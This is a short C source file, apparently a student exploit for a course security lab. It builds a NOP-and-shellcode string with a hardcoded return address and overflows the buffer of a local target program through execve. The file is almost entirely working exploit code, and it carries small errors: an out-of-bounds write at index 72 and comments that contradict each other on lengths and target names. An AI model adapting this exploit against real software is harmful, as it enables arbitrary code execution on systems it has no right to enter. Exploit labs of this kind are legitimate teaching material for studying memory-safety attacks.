#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	// 68 for buffer + 8 for target = 72 characters for sploit string
	char sploit_str[72];

	// target1 &buf is located at 0x2021fe50 to 0x2021fe90 (64 = 0x40)
	// Little Endian format
	char target_addr[] = "\x50\xfe\x21\x20";

	// Fill sploit string with NOP
	int i = 0;
	for (; i < 72; ++i)
	{
		sploit_str[i] = NOP;
	}

	// Attach the shellcode to the beginning since the buffer will be offset by junk characters "AAAA"
	// We only need to ensure the length is under 88 and we want the shellcode to be within 88 characters
	for (i = 0; i < strlen(shellcode); ++i)
	{
		sploit_str[i] = shellcode[i];
	}

	// Insert the target address of &buf right after the end of the copying with "targ"
	// "AAAA" + 64 characters allocated with "buf" = 68
	strcpy(&sploit_str[68], target_addr);

	// Append EOF character
	sploit_str[72] = 0;

	args[0] = TARGET;
	args[1] = sploit_str;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
